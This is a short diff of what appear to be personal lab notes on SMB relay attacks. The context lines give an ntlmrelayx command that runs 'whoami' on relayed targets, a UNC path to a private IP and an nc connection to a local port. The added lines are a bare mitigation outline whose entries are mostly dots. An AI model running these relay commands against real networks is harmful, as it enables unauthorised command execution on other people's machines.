@@ -32,3 +32,28 @@ ntlmrelayx.py -tf targtest.txt -smb2support -c "whoami"
 \\192.168.57.139
 
 nc 127.0.0.1:11000
+
+
+
+
+-- SMB Relay Attacks Mitigation --
+
+Enable SMB Signing on all devices
+.....
+.....
+
+Disable 
+......
+......
+
+Account 
+......
+......
+
+Local admin restriction
+.....
+....
+
+Cyber Mentor
+
+
